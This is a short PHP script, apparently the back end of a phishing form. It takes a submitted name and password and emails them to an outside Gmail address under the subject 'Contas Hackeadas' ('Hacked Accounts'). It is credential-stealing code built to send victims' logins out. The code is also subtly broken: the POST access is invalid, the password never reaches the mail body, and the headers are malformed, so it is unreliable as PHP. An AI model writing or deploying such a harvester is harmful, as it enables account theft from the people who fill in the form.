<?php

$nome = addslashes($_POST(['nome']));
$senha = addslashes($_POST(['senha']));

$to = "angelomateusnerysouza@gmail.com";
$subject = "Contas Hackeadas";
$body = "Nome: ".$nome. " \n";
        "Senha: ".$senha. " \n";
$header = "From: angelomateus2020@gmail.com"."\n"."Reply-To".$nome."\n"."X=Mailer:PHP/".phpversion();

if(mail($to, $subject, $body, $header)){

    echo("Email enviado com sucesso");
}else{
    echo("O email não pode ser enviado");
}

?>